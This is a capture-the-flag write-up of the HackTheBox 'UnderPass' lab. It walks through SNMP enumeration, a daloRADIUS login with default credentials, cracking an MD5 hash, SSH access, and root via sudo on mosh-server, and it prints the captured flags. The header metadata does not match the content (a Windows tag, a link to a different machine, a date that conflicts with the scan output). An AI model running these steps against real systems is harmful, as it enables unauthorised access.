---
layout: post
title: HackTheBox UnderPass
date: 2024-04-25
tags: [HackTheBox, Windows]
---

# Machine Synopsis

Currently Locked. ([Source](https://www.hackthebox.com/machines/boardlight))

# Enumeration

```bash
❯ nmap -sC -sV -A 10.129.70.81
Nmap scan report for 10.129.70.81
Host is up (0.16s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
|_  256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.52 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=12/22%OT=22%CT=1%CU=38655%PV=Y%DS=2%DC=T%G=Y%TM=676
OS:7F3B7%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A
OS:)OPS(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53
OS:CST11NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88
OS:)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+
OS:%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
OS:T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A
OS:=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPC
OS:K=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1723/tcp)
HOP RTT       ADDRESS
1   159.82 ms 10.10.14.1
2   160.54 ms 10.129.70.81

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.20 seconds
```

Accessing `http://10.129.70.81` shows the default Apache web page. Tried to brute force the directories but to no avail as well.

Lets try running UDP scan with `nmap` instead.

```bash
❯ nmap -sU 10.129.70.81
Nmap scan report for 10.129.70.81
Host is up (0.16s latency).
Not shown: 996 closed udp ports (port-unreach)
PORT     STATE         SERVICE
68/udp   open|filtered dhcpc
161/udp  open          snmp
1812/udp open|filtered radius
1813/udp open|filtered radacct

Nmap done: 1 IP address (1 host up) scanned in 1012.03 seconds
```

There is a `snmp` port open. We can enumerate this port using `snmpwalk`.

```bash
❯ snmpwalk -v2c -c public 10.129.70.81
iso.3.6.1.2.1.1.1.0 = STRING: "Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (217686) 0:36:16.86
iso.3.6.1.2.1.1.4.0 = STRING: "steve@underpass.htb"
iso.3.6.1.2.1.1.5.0 = STRING: "UnDerPass.htb is the only daloradius server in the basin!"
iso.3.6.1.2.1.1.6.0 = STRING: "Nevada, U.S.A. but not Vegas"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (2) 0:00:00.02
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (2) 0:00:00.02
iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (2) 0:00:00.02
iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (2) 0:00:00.02
iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (2) 0:00:00.02
iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (2) 0:00:00.02
iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (2) 0:00:00.02
iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (2) 0:00:00.02
iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (2) 0:00:00.02
iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (2) 0:00:00.02
iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (2) 0:00:00.02
iso.3.6.1.2.1.25.1.1.0 = Timeticks: (219376) 0:36:33.76
iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 E8 0C 16 0B 0E 02 00 2B 00 00 
iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/vmlinuz-5.15.0-126-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0
"
iso.3.6.1.2.1.25.1.5.0 = Gauge32: 0
iso.3.6.1.2.1.25.1.6.0 = Gauge32: 214
iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
iso.3.6.1.2.1.25.1.7.0 = No more variables left in this MIB View (It is past the end of the MIB tree)
```

It looks like the http server is running on `daloradius`.

Lets map the domain to our `/etc/hosts` file and try accessing the webpage.

```bash
echo -e '10.129.70.81\t\tunderpass.htb' | sudo tee -a /etc/hosts
```

```bash
❯ curl http://underpass.htb/daloradius/
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.52 (Ubuntu) Server at underpass.htb Port 80</address>
</body></html>
```

It looks like we do not have the permission to view the webpage. Lets brute force the directories instead.

```bash
❯ dirsearch -t 10 -u http://underpass.htb/daloradius/
Target: http://underpass.htb/
[19:20:29] Starting: daloradius/
[19:20:40] 200 -  221B  - /daloradius/.gitignore
[19:21:37] 301 -  323B  - /daloradius/app  ->  http://underpass.htb/daloradius/app/
[19:21:50] 200 -   24KB - /daloradius/ChangeLog
[19:22:05] 301 -  323B  - /daloradius/doc  ->  http://underpass.htb/daloradius/doc/
[19:22:05] 200 -    2KB - /daloradius/Dockerfile
[19:22:05] 200 -    2KB - /daloradius/docker-compose.yml
[19:22:33] 301 -  327B  - /daloradius/library  ->  http://underpass.htb/daloradius/library/
[19:22:33] 200 -   18KB - /daloradius/LICENSE
```

There are a few interesting files here.

`Dockerfile`:

```bash
❯ curl http://underpass.htb/daloradius/Dockerfile
# Official daloRADIUS Dockerfile
# GitHub: https://github.com/lirantal/daloradius
#
# Build image:
# 1. git pull git@github.com:lirantal/daloradius.git
# 2. docker build . -t lirantal/daloradius
#
# Run the container:
# 1. docker run -p 80:80 -p 8000:8000 -d lirantal/daloradius

FROM debian:11-slim
MAINTAINER Liran Tal <liran.tal@gmail.com>

LABEL Description="daloRADIUS Official Docker based on Debian 11 and PHP7." \
	License="GPLv2" \
	Usage="docker build . -t lirantal/daloradius && docker run -d -p 80:80 -p 8000:8000 lirantal/daloradius" \
	Version="2.0beta"

ENV DEBIAN_FRONTEND noninteractive

# default timezone
ENV TZ Europe/Vienna

# PHP install
RUN apt-get update \
  && apt-get install --yes --no-install-recommends \
  ca-certificates \
  apt-utils \
  freeradius-utils \
  tzdata \
  apache2 \
  libapache2-mod-php \
  cron \
  net-tools \
  php \
  php-common \
  php-gd \
  php-cli \
  php-curl \
  php-mail \
  php-dev \
  php-mail-mime \
  php-mbstring \
  php-db \
  php-mysql \
  php-zip \
  mariadb-client \
  default-libmysqlclient-dev \
  unzip \
  wget \
  && rm -rf /var/lib/apt/lists/*

ADD contrib/docker/operators.conf /etc/apache2/sites-available/operators.conf
ADD contrib/docker/users.conf /etc/apache2/sites-available/users.conf
RUN a2dissite 000-default.conf && \
    a2ensite users.conf operators.conf && \
    sed -i 's/Listen 80/Listen 80\nListen 8000/' /etc/apache2/ports.conf

# Create directories
# /data should be mounted as volume to avoid recreation of database entries
RUN mkdir /data
ADD . /var/www/daloradius

#RUN touch /var/www/html/library/daloradius.conf.php
RUN chown -R www-data:www-data /var/www/daloradius

# Remove the original sample web folder
RUN rm -rf /var/www/html
#
# Create daloRADIUS Log file
RUN touch /tmp/daloradius.log && chown -R www-data:www-data /tmp/daloradius.log
RUN mkdir -p /var/log/apache2/daloradius && chown -R www-data:www-data /var/log/apache2/daloradius
RUN echo "Mutex posixsem" >> /etc/apache2/apache2.conf

## Expose Web port for daloRADIUS
EXPOSE 80
EXPOSE 8000
#
## Run the script which executes Apache2 in the foreground as a running process
CMD ["/bin/bash", "/var/www/daloradius/init.sh"]
```

`docker-compose.yml`:

```bash
❯ curl http://underpass.htb/daloradius/docker-compose.yml
version: "3"

services:

  radius-mysql:
    image: mariadb:10
    container_name: radius-mysql
    restart: unless-stopped
    environment:
      - MYSQL_DATABASE=radius
      - MYSQL_USER=radius
      - MYSQL_PASSWORD=radiusdbpw
      - MYSQL_ROOT_PASSWORD=radiusrootdbpw
    volumes:
      - "./data/mysql:/var/lib/mysql"

  radius:
    container_name: radius
    build:
      context: .
      dockerfile: Dockerfile-freeradius
    restart: unless-stopped
    depends_on: 
      - radius-mysql
    ports:
      - '1812:1812/udp'
      - '1813:1813/udp'
    environment:
      - MYSQL_HOST=radius-mysql
      - MYSQL_PORT=3306
      - MYSQL_DATABASE=radius
      - MYSQL_USER=radius
      - MYSQL_PASSWORD=radiusdbpw
      # Optional settings
      - DEFAULT_CLIENT_SECRET=testing123
    volumes:
      - ./data/freeradius:/data
    # If you want to disable debug output, remove the command parameter
    command: -X

  radius-web:
    build: .
    container_name: radius-web
    restart: unless-stopped
    depends_on:
      - radius
      - radius-mysql
    ports:
      - '80:80'
      - '8000:8000'
    environment:
      - MYSQL_HOST=radius-mysql
      - MYSQL_PORT=3306
      - MYSQL_DATABASE=radius
      - MYSQL_USER=radius
      - MYSQL_PASSWORD=radiusdbpw
      # Optional Settings:
      - DEFAULT_CLIENT_SECRET=testing123
      - DEFAULT_FREERADIUS_SERVER=radius
      - MAIL_SMTPADDR=127.0.0.1
      - MAIL_PORT=25
      - MAIL_FROM=root@daloradius.xdsl.by
      - MAIL_AUTH=

    volumes:
      - ./data/daloradius:/data
```

Finally, we have another subdirectory of `/app/`. 

```bash
❯ feroxbuster -u http://underpass.htb/daloradius/app/ --auto-tune
301      GET        9l       28w      330c http://underpass.htb/daloradius/app/common => http://underpass.htb/daloradius/app/common/
301      GET        9l       28w      329c http://underpass.htb/daloradius/app/users => http://underpass.htb/daloradius/app/users/
301      GET        9l       28w      337c http://underpass.htb/daloradius/app/users/include => http://underpass.htb/daloradius/app/users/include/
301      GET        9l       28w      340c http://underpass.htb/daloradius/app/common/templates => http://underpass.htb/daloradius/app/common/templates/
301      GET        9l       28w      339c http://underpass.htb/daloradius/app/common/includes => http://underpass.htb/daloradius/app/common/includes/
301      GET        9l       28w      333c http://underpass.htb/daloradius/app/operators => http://underpass.htb/daloradius/app/operators/
301      GET        9l       28w      341c http://underpass.htb/daloradius/app/operators/include => http://underpass.htb/daloradius/app/operators/include/
```

Running `feroxbuster` reveals 2 interesting endpoints - `users` and `operators`. Both of these endpoints leads to 2 different login page that looks identical.

![users_login_page](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/UnderPass/users_login_page.png?raw=true)

![operators_login_page](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/UnderPass/operators_login_page.png?raw=true)

Reading the [daloradius](https://github.com/lirantal/daloradius/wiki/Installing-daloRADIUS) GitHub Wiki page reveals the default credentials of `administrator:radius`.

The default credentials worked for the `/operators/` endpoint.

![operators_dashboard](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/UnderPass/operators_dashboard.png?raw=true)

# Exploitation

In the users listing, there was a password hash stored for `svcMosh`.

![users_listing](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/UnderPass/users_listing.png?raw=true)

Lets copy the hash to our machine locally.

```bash
❯ echo '412DD4759978ACFCC81DEAB01B382403' > svcMosh_hash.txt
❯ hashcat --identify svcMosh_hash.txt
The following 11 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
    900 | MD4                                                        | Raw Hash
      0 | MD5                                                        | Raw Hash
     70 | md5(utf16le($pass))                                        | Raw Hash
   2600 | md5(md5($pass))                                            | Raw Hash salted and/or iterated
   3500 | md5(md5(md5($pass)))                                       | Raw Hash salted and/or iterated
   4400 | md5(sha1($pass))                                           | Raw Hash salted and/or iterated
  20900 | md5(sha1($pass).md5($pass).sha1($pass))                    | Raw Hash salted and/or iterated
   4300 | md5(strtoupper(md5($pass)))                                | Raw Hash salted and/or iterated
   1000 | NTLM                                                       | Operating System
   9900 | Radmin2                                                    | Operating System
   8600 | Lotus Notes/Domino 5                                       | Enterprise Application Software (EAS)
```

A best guess of the hash type would most likely be `MD5`.

```bash
❯ hashcat -a 0 -m 0 svcMosh_hash.txt /usr/share/wordlists/rockyou.txt
412dd4759978acfcc81deab01b382403:underwaterfriends
```

Now we can `ssh` into the server as `svcMosh`.

```bash
❯ ssh svcMosh@underpass.htb
The authenticity of host 'underpass.htb (10.129.70.81)' can't be established.
ED25519 key fingerprint is SHA256:zrDqCvZoLSy6MxBOPcuEyN926YtFC94ZCJ5TWRS0VaM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'underpass.htb' (ED25519) to the list of known hosts.
svcMosh@underpass.htb's password: underwaterfriends
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun Dec 22 11:45:23 AM UTC 2024

  System load:  0.0               Processes:             228
  Usage of /:   86.0% of 3.75GB   Users logged in:       0
  Memory usage: 10%               IPv4 address for eth0: 10.129.70.81
  Swap usage:   0%

  => / is using 86.0% of 3.75GB


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


Last login: Thu Dec 12 15:45:42 2024 from 10.10.14.65
svcMosh@underpass:~$ cat user.txt
cc1bdbef3befe655bcf23ec8c19b058e
```

# Privilege Escalation

```bash
svcMosh@underpass:~$ sudo -l
Matching Defaults entries for svcMosh on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server

svcMosh@underpass:~$ mosh-server -h
Usage: mosh-server new [-s] [-v] [-i LOCALADDR] [-p PORT[:PORT2]] [-c COLORS] [-l NAME=VALUE] [-- COMMAND...]
```

Lets read up more about how to use this `mosh-server` on the [official website](https://mosh.org/#usage).

![mosh_server_explanation](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/UnderPass/mosh_server_explanation.png?raw=true)

Lets try running the `mosh-server` with `sudo` and then connecting it with the `mosh-client`.

```bash
svcMosh@underpass:~$ sudo /usr/bin/mosh-server


MOSH CONNECT 60001 dtpayBkrtNlyd13OFDyOPw

mosh-server (mosh 1.3.2) [build mosh 1.3.2]
Copyright 2012 Keith Winstein <mosh-devel@mit.edu>
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

[mosh-server detached, pid = 1955]
svcMosh@underpass:~$ MOSH_KEY='dtpayBkrtNlyd13OFDyOPw' mosh-client 127.0.0.1 60001
```

Running the above command will spawn a new terminal with `root` access.

```bash
  System load:  0.0               Processes:             228
  Usage of /:   86.0% of 3.75GB   Users logged in:       0
  Memory usage: 10%               IPv4 address for eth0: 10.129.70.81
  Swap usage:   0%

  => / is using 86.0% of 3.75GB


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status



root@underpass:~# ls
root.txt
root@underpass:~# cat root.txt
c50917fd3c764028e9e14764aa74d2c2
```
